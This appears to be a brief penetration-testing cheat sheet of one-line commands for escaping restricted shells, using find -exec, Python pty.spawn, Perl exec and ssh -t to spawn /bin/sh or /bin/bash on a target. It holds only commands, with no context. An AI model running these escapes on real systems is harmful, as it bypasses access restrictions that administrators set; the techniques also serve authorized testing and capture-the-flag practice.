## Shell escape techniques
	Utilizing binaries such as vi, vim, nmap, man, etc...

## Find
	#only works if file test exists in path /home/bob
	find /home/bob -name test -exec /bin/sh \; 

## Python
	python -c 'import pty;pty.spawn("/bin/bash")'
	python -c 'import pty;pty.spawn("/bin/sh")'
## Perl
	perl -e 'exec "/bin/bash";'
	perl -e 'exec "/bin/sh";'

## SSH
	ssh restricted_user@target -t "/bin/sh"
	ssh restricted_user@target -t "/bin/bash"